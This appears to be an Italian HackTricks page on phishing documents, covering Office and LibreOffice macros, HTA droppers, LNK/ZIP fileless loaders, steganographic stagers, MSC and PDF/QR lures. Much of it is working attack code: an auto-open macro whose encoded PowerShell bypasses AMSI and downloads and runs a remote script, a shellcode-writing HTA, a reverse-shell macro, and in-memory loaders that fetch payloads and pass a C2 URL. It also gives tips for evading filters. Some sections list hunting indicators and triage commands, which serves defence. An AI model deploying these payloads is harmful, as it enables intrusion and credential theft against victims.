# File e documenti di phishing

{{#include ../../banners/hacktricks-training.md}}

## Documenti Office

Microsoft Word esegue la convalida dei dati del file prima di aprirlo. La convalida dei dati viene eseguita identificando le strutture dei dati secondo lo standard OfficeOpenXML. Se durante l’identificazione delle strutture dei dati si verifica un errore, il file analizzato non verrà aperto.

Di solito, i file Word contenenti macro usano l’estensione `.docm`. Tuttavia, è possibile rinominare il file modificandone l’estensione e mantenere comunque la capacità di eseguire macro.\
Per esempio, un file RTF non supporta le macro per progettazione, ma un file DOCM rinominato in RTF verrà gestito da Microsoft Word e sarà in grado di eseguire macro.\
Gli stessi meccanismi interni si applicano a tutti i software della suite Microsoft Office (Excel, PowerPoint ecc.).

Puoi usare il seguente comando per verificare quali estensioni verranno eseguite da alcuni programmi Office:

```bash
assoc | findstr /i "word excel powerp"
```

I file DOCX che fanno riferimento a un template remoto (File –Opzioni –Componenti aggiuntivi –Gestisci: Template –Vai) che include macro possono anche “eseguire” macro.

### Caricamento di immagini esterne

Vai a: _Inserisci --> Parti rapide --> Campo_\
_**Categorie**: Collegamenti e riferimenti, **Nomi dei campi**: includePicture e **Nome file o URL**:_ http://<ip>/whatever

![Documenti Office - Caricamento di immagini esterne: Vai a: Inserisci -- Parti rapide -- Campo](<../../images/image (155).png>)

### Backdoor delle macro

È possibile usare le macro per eseguire codice arbitrario dal documento.

#### Funzioni di caricamento automatico

Più sono comuni, più è probabile che l'AV le rilevi.

- AutoOpen()
- Document_Open()

#### Esempi di codice per macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Rimuovere manualmente i metadati

Vai su **File > Info > Inspect Document > Inspect Document** per aprire Document Inspector. Fai clic su **Inspect**, quindi su **Remove All** accanto a **Document Properties and Personal Information**.

#### Estensione Doc

Al termine, seleziona il menu a discesa **Save as type** e cambia il formato da **`.docx`** a Word 97-2003 **`.doc`**.\
Fallo perché **non puoi salvare macro all'interno di un file `.docx`** e l'estensione **`.docm`** con macro abilitate ha una **cattiva reputazione** (ad esempio, l'icona della miniatura mostra un enorme `!` e alcuni gateway web/email le bloccano del tutto). Pertanto, la **vecchia estensione `.doc` è il miglior compromesso**.

#### Generatori di macro malevole

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro ad esecuzione automatica di LibreOffice ODT (Basic)

I documenti di LibreOffice Writer possono incorporare macro Basic ed eseguirle automaticamente all'apertura del file associando la macro all'evento **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Una semplice macro reverse shell è simile a questa:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Nota le virgolette doppie (`""`) all'interno della stringa: LibreOffice Basic le usa per rappresentare virgolette letterali, quindi i payload che terminano con `...==""")` mantengono bilanciati sia il comando interno sia l'argomento di Shell.

Suggerimenti per la consegna:

- Salva il documento come `.odt` e associa la macro all'evento del documento in modo che venga eseguita immediatamente all'apertura.
- Quando invii un'email con `swaks`, usa `--attach @resume.odt` (`@` è necessario affinché venga inviato il contenuto del file, non la stringa del nome del file, come allegato). Questo è fondamentale quando si sfruttano server SMTP che accettano destinatari `RCPT TO` arbitrari senza convalida.

## File HTA

Un HTA è un programma Windows che **combina HTML e linguaggi di scripting (come VBScript e JScript)**. Genera l'interfaccia utente e viene eseguito come applicazione «completamente attendibile», senza i vincoli del modello di sicurezza di un browser.

Un HTA viene eseguito usando **`mshta.exe`**, che in genere viene **installato** insieme a **Internet Explorer**, rendendo **`mshta` dipendente da IE**. Pertanto, se IE è stato disinstallato, gli HTA non potranno essere eseguiti.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forzare l'autenticazione NTLM

Esistono diversi modi per **forzare l'autenticazione NTLM "da remoto"**. Per esempio, potresti aggiungere **immagini invisibili** alle email o a pagine HTML a cui l'utente accederà (anche tramite HTTP MitM?). Oppure inviare alla vittima gli **indirizzi dei file** che **attiveranno** un'**autenticazione** semplicemente **aprendo la cartella**.

**Consulta queste idee e altre ancora nelle pagine seguenti:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Non dimenticare che non puoi solo rubare l'hash o l'autenticazione, ma anche **eseguire attacchi NTLM relay**:

- [**Attacchi NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay verso i certificati)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + payload incorporati in ZIP (catena fileless)

Le campagne altamente efficaci distribuiscono un file ZIP contenente due documenti esca legittimi (PDF/DOCX) e un .lnk malevolo. Il trucco consiste nel memorizzare il loader PowerShell effettivo nei byte grezzi dello ZIP, dopo un marcatore univoco; il file .lnk lo estrae e lo esegue interamente in memoria.<sup>[[2]](#references)</sup>

Flusso tipico implementato dal one-liner PowerShell del file .lnk:

1) Individua lo ZIP originale nei percorsi comuni: Desktop, Downloads, Documents, %TEMP%, %ProgramData% e la cartella padre della directory di lavoro corrente.
2) Legge i byte dello ZIP e cerca un marcatore codificato nel codice (ad es., xFIQCV). Tutto ciò che segue il marcatore è il payload PowerShell incorporato.
3) Copia lo ZIP in %ProgramData%, lo estrae lì e apre il file .docx esca per sembrare legittimo.
4) Bypassa AMSI per il processo corrente: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deoffusca lo stage successivo (ad es., rimuovendo tutti i caratteri #) e lo esegue in memoria.

Esempio di scheletro PowerShell per estrarre ed eseguire lo stage incorporato:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Note
- La delivery spesso abusa di sottodomini PaaS affidabili (ad es., *.herokuapp.com) e può limitare i payload (distribuendo ZIP benigni in base all'IP/UA).
- Lo stage successivo decritta spesso shellcode base64/XOR e lo esegue tramite Reflection.Emit + VirtualAlloc per ridurre al minimo gli artefatti su disco.

Persistence usata nella stessa chain
- COM TypeLib hijacking del controllo Microsoft Web Browser, in modo che IE/Explorer o qualsiasi app che lo incorpora rilanci automaticamente il payload.<sup>[[2]](#references)[[4]](#references)</sup> Vedi qui i dettagli e i comandi pronti all'uso:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOC
- File ZIP contenenti la stringa marker ASCII (ad es., xFIQCV) aggiunta ai dati dell'archivio.
- File .lnk che enumerano le cartelle parent/utente per individuare lo ZIP e aprono un documento esca.
- Tampering di AMSI tramite [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Thread aziendali di lunga durata che terminano con link ospitati su domini PaaS affidabili.

## Staging con esca LNK prima di tutto → persistence tramite scheduled task → side-loading di CPL affidabile

Un altro pattern ricorrente è un **`.lnk` che si spaccia per un documento** e apre immediatamente un'esca innocua mentre prepara la chain reale in background.<sup>[[3]](#references)</sup>

Workflow osservato:
1. Il collegamento **si spaccia per un PDF** e usa `conhost.exe` o un proxy simile per avviare un downloader PowerShell offuscato.
2. PowerShell frammenta token evidenti (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), così le detection ingenue che cercano `iwr`, `gci`, `ren`, `cpi` o `schtasks` non rilevano il comando.
3. Lo stager scarica **prima il documento esca**, lo apre per la vittima e poi ricostruisce i file malevoli in background.
4. I payload possono essere scritti con **estensioni spazzatura** e poi rinominati rimuovendo caratteri di riempimento, ritardando la comparsa di artefatti evidenti `.exe` / `.cpl`.
5. La persistence viene stabilita con uno **scheduled task basato sui minuti** che avvia un host binary affidabile da un percorso scrivibile dall'utente.

Indizi minimi per l'hunting basati su questo pattern:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Una disposizione di staging utile da riconoscere è:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` o `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Perché il secondo stage è furtivo

Nel case study di Rapid7, il task pianificato avviava ripetutamente **`Fondue.exe`** da `C:\Users\Public\`. Poiché **`APPWIZ.cpl`** era stato posizionato nella stessa directory ed esportava **`RunFODW`**, il binario Microsoft attendibile caricava tramite side-loading il CPL dell'attaccante anziché la copia legittima del sistema.

Il CPL:
- Legge un blob **AES-256-CBC** da `C:\Windows\Tasks\editor.dat`
- Lo decifra tramite **Windows CNG / `bcrypt.dll`**
- Alloca memoria eseguibile e vi copia la shellcode decifrata
- La esegue indirettamente passando il puntatore alla shellcode come callback di **`EnumUILanguagesW`**

Quest'ultimo passaggio merita un'indagine separata: spesso il malware evita un salto diretto `((void(*)())buf)()` e sfrutta invece una **WinAPI legittima che accetta callback** per trasferire l'esecuzione.

Il payload decifrato in questa campagna era shellcode **Donut**, che poi mappava la PE finale interamente in memoria e applicava patch a **AMSI/WLDP/ETW** nel processo corrente prima di cedere l'esecuzione. Per approfondire il side-loading e la post-elaborazione residente in memoria, consulta:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Indicatori pratici da usare nelle indagini:
- `.lnk` che avvia `powershell.exe` o `conhost.exe`, seguito da un documento-esca visibile.
- Download di breve durata in **`C:\Users\Public\`**, seguiti da rinominazioni immediate da estensioni senza senso.
- Task pianificati con nomi generici come `GoogleErrorReport` che vengono eseguiti da **directory scrivibili dall'utente**.
- Binari attendibili che caricano file **`.cpl` / `.dll`** dalla stessa directory non di sistema.
- Blob di testo Base64 scritti in **`C:\Windows\Tasks\`** e poi letti dal modulo caricato tramite side-loading.

## Payload delimitati tramite steganografia nelle immagini (stager PowerShell)

Le recenti catene di loader distribuiscono JavaScript/VBS offuscati che decodificano e avviano uno stager PowerShell Base64. Lo stager scarica un'immagine (spesso GIF) che contiene una DLL .NET codificata in Base64 e nascosta come testo normale tra marcatori univoci di inizio e fine. Lo script cerca questi delimitatori (esempi rilevati in natura: «<<sudo_png>> … <<sudo_odt>>>»), estrae il testo compreso tra essi, lo decodifica da Base64 in byte, carica l'assembly in memoria e invoca un metodo di ingresso noto passandogli l'URL C2.<sup>[[5]](#references)</sup>

Flusso di lavoro
- Stage 1: dropper JS/VBS archiviato → decodifica il Base64 incorporato → avvia lo stager PowerShell con -nop -w hidden -ep bypass.
- Stage 2: stager PowerShell → scarica un'immagine, estrae il Base64 delimitato dai marcatori, carica la DLL .NET in memoria e ne chiama il metodo (ad es. VAI) passandogli l'URL C2 e le opzioni.
- Stage 3: il loader recupera il payload finale e in genere lo inietta tramite process hollowing in un binario attendibile (comunemente MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Scopri di più sul process hollowing e sull'esecuzione tramite proxy di utility attendibili qui:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Esempio PowerShell per estrarre una DLL da un'immagine e invocare in memoria un metodo .NET:

<details>
<summary>Estrattore di payload stego e loader PowerShell</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Note
- Questo è ATT&CK T1027.003 (steganografia/nascondere marker).<sup>[[6]](#references)</sup> I marker variano da una campagna all’altra.
- AMSI/ETW bypass e deoffuscamento delle stringhe vengono comunemente applicati prima del caricamento dell’assembly.
- Threat hunting: scansionare le immagini scaricate alla ricerca di delimitatori noti; identificare i casi in cui PowerShell accede alle immagini e decodifica immediatamente blob Base64.

Vedi anche gli strumenti stego e le tecniche di carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Dropper JS/VBS → staging PowerShell Base64

Una fase iniziale ricorrente consiste in un file `.js` o `.vbs` piccolo e fortemente offuscato, distribuito all’interno di un archivio. Il suo unico scopo è decodificare una stringa Base64 incorporata e avviare PowerShell con `-nop -w hidden -ep bypass` per predisporre la fase successiva tramite HTTPS.<sup>[[5]](#references)</sup>

Logica schematica (astratta):
- Leggere il contenuto del proprio file
- Individuare un blob Base64 tra stringhe spazzatura
- Decodificarlo in PowerShell ASCII
- Eseguirlo con `wscript.exe`/`cscript.exe` invocando `powershell.exe`

Indicatori per il threat hunting
- Allegati JS/VBS archiviati che avviano `powershell.exe` con `-enc`/`FromBase64String` nella riga di comando.
- `wscript.exe` che avvia `powershell.exe -nop -w hidden` da percorsi temporanei dell’utente.

## Documenti MSC come contenitori di esecuzione (GrimResource)

I file Microsoft Management Console (`.msc`) sono definizioni di console XML normalmente aperte da `mmc.exe`. **GrimResource** sfrutta un riferimento `StringTable` a una risorsa `apds.dll` contenente una vecchia primitiva XSS, per cui l’apertura della console appositamente creata da parte dell’utente fa eseguire JavaScript all’interno di `mmc.exe`. I campioni osservati combinavano offuscamento basato su `transformNode` con **DotNetToJScript** per istanziare un payload .NET senza ricorrere al consueto percorso delle macro di Office.<sup>[[9]](#references)</sup>

Per il triage statico, trattare un MSC non attendibile come testo e **non** fare doppio clic:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Gli indicatori runtime ad alto valore sono `mmc.exe` che carica il CLR o componenti script, crea connessioni di rete oppure avvia `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` o un eseguibile imprevisto. Il formato è legittimo, quindi i rilevamenti dovrebbero correlare **origine + contenuto XML/script sospetto + comportamento di `mmc.exe`** invece di bloccare ogni MSC.<sup>[[9]](#references)</sup>

## PDF/QR redirector e payload gating

Un PDF non ha bisogno di un exploit per essere utile. Campagne recenti inseriscono un **codice QR o un normale link** in un documento dall’aspetto innocuo, allontanano la sessione del browser dai controlli della posta e personalizzano la destinazione con l’indirizzo del destinatario. Microsoft ha documentato PDF del 2025 con URL QR univoci per ogni destinatario, che portavano all’infrastruttura di raccolta delle credenziali RaccoonO365; una catena parallela usava il gating basato su IP/ambiente per restituire un percorso JavaScript/MSI ai visitatori selezionati e un PDF innocuo agli scanner o ai client non consentiti.<sup>[[10]](#references)</sup>

Analizza sia le azioni PDF sia i codici QR renderizzati. Un QR può essere disegnato come vettore invece di essere memorizzato come immagine estraibile, quindi rasterizza ogni pagina oltre a estrarre le immagini incorporate:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Ispeziona le destinazioni decodificate e i reindirizzamenti da un sistema di analisi isolato, senza autenticarti. Tra gli elementi utili da cercare ci sono PDF contenenti solo QR code con messaggi email quasi vuoti, l’indirizzo email del destinatario incorporato in un parametro di query, diversi reindirizzamenti tramite servizi di hosting affidabili e contenuti diversi in base a IP, geolocalizzazione, cookie, referrer o user agent. Confronta le richieste usando profili controllati: una singola richiesta dalla sandbox potrebbe ricevere solo il contenuto-esca.<sup>[[10]](#references)</sup>

## File Windows per sottrarre hash NTLM

Consulta la pagina su **luoghi in cui sottrarre credenziali NTLM**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro di LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagna ZipLine: un attacco di phishing sofisticato rivolto alle aziende statunitensi](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: tracciamento delle tecniche operative di Dropping Elephant tramite una catena di loader a tema cinese](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Nuova tecnica di persistenza COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Il loader PhantomVAI distribuisce diversi infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografia (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Esecuzione proxy tramite utilità attendibili per sviluppatori: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console per l’accesso iniziale e l’elusione](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Gli attori delle minacce sfruttano il periodo delle dichiarazioni dei redditi per diffondere campagne di phishing a tema fiscale](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
